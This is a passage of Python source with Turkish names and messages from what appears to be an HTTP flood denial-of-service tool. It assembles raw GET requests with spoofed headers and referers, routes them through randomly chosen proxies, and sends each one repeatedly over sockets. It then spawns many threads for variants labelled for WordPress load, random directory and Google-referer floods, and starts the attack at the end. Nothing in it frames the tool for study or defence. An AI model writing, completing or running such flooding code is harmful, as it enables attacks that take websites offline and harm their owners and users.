        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
         
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass

def bb():
    for i in range(int(threads)):
            worker = Thread(target=basladex)
            #worker.setDaemon(True)
            worker.start()
def bbnormalwprandom():
    for i in range(int(threads)):
            worker = Thread(target=normalwprandom)
            #worker.setDaemon(True)
            worker.start()
def bbnormalwpload():
    for i in range(int(threads)):
            worker = Thread(target=normalwpload)
            #worker.setDaemon(True)
            worker.start()
def bbnormaldizinrandom():
    for i in range(int(threads)):
            worker = Thread(target=normaldizinrandom)
            #worker.setDaemon(True)
            worker.start()

def bbgooglebasladex():
    for i in range(int(threads)):
            worker = Thread(target=googlebasladex)
            #worker.setDaemon(True)
            worker.start()
def bbgoogledizinrandom():
    for i in range(int(threads)):
            worker = Thread(target=googledizinrandom)
            #worker.setDaemon(True)
            worker.start()
def bbgooglewpload():
    for i in range(int(threads)):
            worker = Thread(target=googlewpload)
            #worker.setDaemon(True)
            worker.start()
def bbgooglewprandom():
    for i in range(int(threads)):
            worker = Thread(target=googlewprandom)
            #worker.setDaemon(True)
            worker.start()
baslatdex()